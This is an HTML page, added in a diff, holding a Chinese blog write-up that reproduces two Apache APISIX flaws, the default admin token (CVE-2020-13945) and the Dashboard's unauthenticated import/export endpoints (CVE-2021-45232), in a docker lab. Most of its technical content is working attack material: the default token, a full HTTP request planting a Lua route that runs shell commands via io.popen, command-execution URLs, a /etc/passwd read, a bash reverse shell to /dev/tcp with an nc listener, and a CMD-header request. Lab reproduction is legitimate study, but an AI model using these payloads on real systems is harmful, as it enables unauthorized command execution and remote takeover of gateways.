@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>apisix | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apache APISIX 默认密钥漏洞（CVE-2020-13945）简介介绍​        Apache APISIX是一个高性能API网关 ​        API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。 ​        任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。如果两个系统中间通信，在系">
+<meta property="og:type" content="article">
+<meta property="og:title" content="apisix">
+<meta property="og:url" content="http://example.com/2023/11/10/apisix/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache APISIX 默认密钥漏洞（CVE-2020-13945）简介介绍​        Apache APISIX是一个高性能API网关 ​        API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。 ​        任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。如果两个系统中间通信，在系">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112164506696.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112164452893.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112165442654.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112165550466.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112165700875.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112165819660.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112170315575.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112170301584.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112172949477.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231112173040041.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231114134328120.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231115153350989.png">
+<meta property="og:image" content="http://example.com/2023/11/10/apisix/image-20231115154024594.png">
+<meta property="article:published_time" content="2023-11-10T03:21:20.000Z">
+<meta property="article:modified_time" content="2023-11-17T11:15:49.898Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="apisix">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/10/apisix/image-20231112164506696.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-apisix" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/11/10/apisix/" class="article-date">
+  	<time datetime="2023-11-10T03:21:20.000Z" itemprop="datePublished">2023-11-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      apisix
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/apisix/" rel="tag">apisix</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​        Apache APISIX是一个高性能API网关</p>
+<p>​        API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>​        任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Apache APISIX 2.11.0（这个漏洞并没有且应该不会被官方修复，所以到最新版仍然存在）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231112164506696.png" alt="image-20231112164506696"></p>
+<p>环境启动后，访问<code>http://your-ip:9080</code>即可查看到默认的404页面。</p>
+<p><img src="image-20231112164452893.png" alt="image-20231112164452893"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.访问：ip:9080/apisix/admin/routes,如图出现failed to check token</p>
+<p><img src="image-20231112165442654.png" alt="image-20231112165442654"></p>
+<p>2.抓包，改为post请求方式，添加</p>
+<p>X-API-KEY: edd1c9f034335f136f87ad84b625c8f1请求头和poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;apisix&#x2F;admin&#x2F;routes HTTP&#x2F;1.1</span><br><span class="line">Host: ip:9080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;119.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 406</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;&#x2F;attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M &#x3D; &#123;&#125; \n function _M.access(conf, ctx) \n local os &#x3D; require(&#39;os&#39;)\n local args &#x3D; assert(ngx.req.get_uri_args()) \n local f &#x3D; assert(io.popen(args.cmd, &#39;r&#39;))\n local s &#x3D; assert(f:read(&#39;*a&#39;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231112165550466.png" alt="image-20231112165550466"></p>
+<p><img src="image-20231112165700875.png" alt="image-20231112165700875"></p>
+<p>3.访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:9080&#x2F;attack?cmd&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231112165819660.png" alt="image-20231112165819660"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>1.访问地址：<a target="_blank" rel="noopener" href="http://ip:9080/attack?cmd=cat%20/etc/passwd%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%EF%BC%8C%E5%B0%86cmd%E5%90%8E%E7%9A%84%E5%80%BC%E6%9B%BF%E6%8D%A2%E4%B8%BA%EF%BC%9A%EF%BC%88bash">http://ip:9080/attack?cmd=cat%20/etc/passwd，进行抓包，将cmd后的值替换为：（bash</a> -c “bash -i &gt;&amp; /dev/tcp/ip/9999 0&gt;&amp;1”）</p>
+<p>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2F9999%200%3E%261%22<br><img src="image-20231112170315575.png" alt="image-20231112170315575"></p>
+<p><strong>在kali虚拟机中开启nc监听</strong></p>
+<p><img src="image-20231112170301584.png" alt="image-20231112170301584"></p>
+<h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）"></a>Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​        Apache APISIX <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Dashboard&spm=1001.2101.3001.7020">Dashboard</a> &lt; 2.10.1</p>
+<p>​        安全版本：Apache APISIX Dashboard &gt;= 2.10.1</p>
+<p>​        FOFA语句：title=”Apache APISIX Dashboard”</p>
+<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​            Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231112172949477.png" alt="image-20231112172949477"></p>
+<p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p>
+<p><img src="image-20231112173040041.png" alt="image-20231112173040041"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="未授权接口RCE"><a href="#未授权接口RCE" class="headerlink" title="未授权接口RCE"></a>未授权接口RCE</h3><p>那如果没有默认密码或者弱密码的话，就利用未授权接口进行RCE了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;apisix&#x2F;admin&#x2F;migrate&#x2F;export</span><br><span class="line">&#x2F;apisix&#x2F;admin&#x2F;migrate&#x2F;import</span><br></pre></td></tr></table></figure>
+
+<p>这里需要知道这两个接口一个是用来导出配置文件，一个是用来导入配置文件的。</p>
+<p>可以使用<code>/apisix/admin/migrate/export</code>直接导出配置文件</p>
+<p>可以尝试访问下，当然利用的是未授权接口，自然是不用登录</p>
+<p><img src="image-20231114134328120.png" alt="image-20231114134328120"></p>
+<p>访问可以看到配置文件信息，这里仔细看，后面多出四个字节，这4个字节其实是配置文件的checksum值</p>
+<p>注意的是，这个配置文件的最后4个字符是当前文件的CRC校验码，所以最好通过自动化工具来生成和发送这个利用数据包</p>
+<p><img src="image-20231115153350989.png" alt="image-20231115153350989"></p>
+<p>添加完恶意路由后，你需要访问Apache APISIX中对应的路径来触发前面添加的脚本。值得注意的是，Apache APISIX和Apache APISIX Dashboard是两个不同的服务，Apache APISIX Dashboard只是一个管理页面，而添加的路由是位于Apache APISIX中，所以需要找到Apache APISIX监听的端口或域名。</p>
+<p>在当前环境下，Apache APISIX监听在9080端口下。我们发送数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;9gEzWB HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:9080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;105.0.5195.102 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">CMD: id</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可见，在Header中添加的<code>CMD</code>头中的命令已被执行。</p>
+<p>这个漏洞是Apache APISIX Dashboard的漏洞，而Apache APISIX无需配置IP白名单或管理API，只要二者连通同一个etcd即可。</p>
+<p><img src="image-20231115154024594.png" alt="image-20231115154024594"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/15/appweb-aria2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          appweb-aria2
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/06/apache-druid-apereo-cas/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">apache-druid--apereo-cas</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
